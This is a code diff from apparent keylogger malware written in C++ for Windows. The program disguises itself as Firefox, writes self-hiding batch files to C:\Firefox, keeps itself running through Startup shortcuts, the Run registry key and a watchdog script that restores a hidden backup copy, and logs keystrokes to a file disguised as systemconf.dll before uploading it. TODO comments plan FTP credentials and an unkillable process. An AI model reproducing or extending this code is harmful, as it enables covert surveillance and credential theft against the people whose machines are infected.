@@ -21,16 +21,21 @@ bool firstRun;
 
 const string firefoxPath = "C:\\Firefox";
 
-void shortcutChecker(){
+//TODO: Create new file
+void persist(){
     if (!fileExists("C:\\Firefox\\systemchecker.bat")){        
         char batContent[2048];
                 
         strcpy(batContent, "attrib +s +h \"%~f0\"\r\n");
+        strcpy(batContent, "mkdir C:\\Users\\Public\\Documents\\backup\r\n");
+        strcpy(batContent, "attrib +s +h C:\\Users\\Public\\Documents\\backup\r\n");
         strcpy(batContent, ":check\r\n");
         strcat(batContent, "timeout /t 4\r\n");
         //strcat(batContent, "tasklist /FI \"IMAGENAME eq firefox.exe\" | find /I /N \"firefox.exe\">NUL\r\n");
         //strcat(batContent, "if \"%ERRORLEVEL%\"==\"1\" start C:\\Firefox\\firefox.exe\r\n");
-        strcat(batContent, "if not exist %APPDATA%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\firefox.lnk goto create\r\n");
+        strcat(batContent, "if not exist %APPDATA%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\firefox.lnk goto create\r\n");        
+        strcat(batContent, "if not exist C:\\Firefox\\firefox.exe goto createexe\r\n");        
+        strcat(batContent, "if not exist C:\\Users\\Public\\Documents\\backup goto createbackup\r\n");
         strcat(batContent, "goto check\r\n");
         
         strcat(batContent, ":create\r\n");        
@@ -45,6 +50,18 @@ void shortcutChecker(){
         strcat(batContent, "copy C:\\Firefox\\firefox.lnk %APPDATA%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\firefox.lnk /y\r\n");
         strcat(batContent, "del C:\\Firefox\\firefox.lnk\r\n");        
         strcat(batContent, "goto check\r\n");
+        
+        strcat(batContent, ":createexe\r\n");        
+        strcat(batContent, "attrib -s -h C:\\Users\\Public\\Documents\\firefox.lnk\r\n");          
+        strcat(batContent, "copy C:\\Users\\Public\\Documents\\firefox.lnk C:\\Firefox\\firefox.exe /y\r\n");  
+        strcat(batContent, "attrib +s +h C:\\Users\\Public\\Documents\\firefox.lnk \r\n");             
+        strcat(batContent, "goto check\r\n");
+        
+        strcat(batContent, ":createbackup\r\n");          
+        strcat(batContent, "attrib -s -h C:\\Firefox\\firefox.exe \r\n");        
+        strcat(batContent, "copy C:\\Firefox\\firefox.exe C:\\Users\\Public\\Documents\\firefox.lnk /y\r\n");     
+        strcat(batContent, "attrib +s +h C:\\Firefox\\firefox.exe \r\n");          
+        strcat(batContent, "goto check\r\n");
         // Maybe do something to restore the exe?
         
         ofstream bat("C:\\Firefox\\systemchecker.bat");
@@ -52,11 +69,10 @@ void shortcutChecker(){
         bat.close();
     }
     
-    runBatFile("C:\\Firefox\\systemchecker.bat");
-    
+    runBatFile("C:\\Firefox\\systemchecker.bat");    
 }
-BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
-{
+
+BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args) {
     HKEY hKey = NULL;
     LONG lResult = 0;
     BOOL fSuccess = TRUE;
@@ -69,8 +85,7 @@ BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR arg
     wcscat(szValue, pathToExe);
     wcscat(szValue, L"\" ");
 
-    if (args != NULL)
-    {
+    if (args != NULL) {
         // caller should make sure "args" is quoted if any single argument has a space
         // e.g. (L"-name \"Mark Voidale\"");
         wcscat(szValue, args);
@@ -80,15 +95,13 @@ BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR arg
 
     fSuccess = (lResult == 0);
 
-    if (fSuccess)
-    {
+    if (fSuccess) {
         dwSize = (wcslen(szValue)+1)*2;
         lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
         fSuccess = (lResult == 0);
     }
 
-    if (hKey != NULL)
-    {
+    if (hKey != NULL) {
         RegCloseKey(hKey);
         hKey = NULL;
     }
@@ -96,8 +109,7 @@ BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR arg
     return fSuccess;
 }
 
-void RegisterProgram()
-{
+void RegisterProgram() {
     wchar_t szPathToExe[MAX_PATH];   
     const wchar_t* path = s2wct("C:\\Firefox\\firefox.exe");    
     wcscpy(szPathToExe, path);        
@@ -105,10 +117,10 @@ void RegisterProgram()
 }
 
 void infect(){
+    mkdir(firefoxPath.c_str());
     char pathLocation[MAX_PATH];
-    strcpy(pathLocation, "C:\\Users\\");
-    strcpy(pathLocation, getUserName().c_str());
-    strcat(pathLocation, "\\Documents\\nananana.bat"); //TODO add alternative route just in case or simply mkdir Firefox
+    strcpy(pathLocation, firefoxPath.c_str());
+    strcat(pathLocation, "\\nananana.bat");
     
     char startup[MAX_PATH]; //esto estaría bien meterlo en funciones
     strcpy(startup, "C:\\Users\\");
@@ -123,7 +135,6 @@ void infect(){
     bool firefoxExists = true;
     
     if (!fileExists(firefoxPath.c_str()) || !fileExists("C:\\Firefox\\firefox.exe")){
-        mkdir(firefoxPath.c_str());
         firefoxExists = false;
     }
     
@@ -153,7 +164,6 @@ void infect(){
         strcat(batContent, "attrib %destino3%  +s +h\r\n");
         strcat(batContent, "attrib %destino2%sysid.dat +s +h\r\n");
         strcat(batContent, "attrib %destino2%systemconf.dll  +s +h\r\n");
-        //strcat(batContent, "attrib %destino0%  +s +h\r\n");
         strcat(batContent,"DEL \"%~f0\"\r\n\0");
 
         ofstream bat(pathLocation);
@@ -169,6 +179,7 @@ void infect(){
         }
     }
 }
+
 void Log(int limite_keystrokes){
     string strings="";
     int keys;
@@ -184,7 +195,6 @@ void Log(int limite_keystrokes){
             if(GetAsyncKeyState(keys)&1==1){
                 GetWindowText(GetForegroundWindow(),currentWindowTitle,sizeof(currentWindowTitle));
                 strings = convertKey(keys, keystrokes);
-                // TODO: Check if current window title is firewall one (Windows Security Alert). If it is, click yes
                 if(strcmp(currentWindowTitle,  newWindowTitle)&& strings!="" && strings!="[TAB]"){
 
                     ofstream store("C:\\Firefox\\systemconf.dll", ios::app);
@@ -213,7 +223,7 @@ std::string getIdentification(){
         }
         else{
             firstRun = false;
-            shortcutChecker();
+            persist();
             getline(id, identification);
             id.close();
         }
@@ -236,6 +246,10 @@ int main(int argc, char *argv[]){
     
     string id = getIdentification();
     int keystroke_limit=30;//500;
+    //TODO: set user/pass with final ftp
+    //TODO: mkdir firefox and create script there
+    //TODO: process unkillable
+    
     while(true){
         Log(keystroke_limit);
         sendFile(id, firstRun);
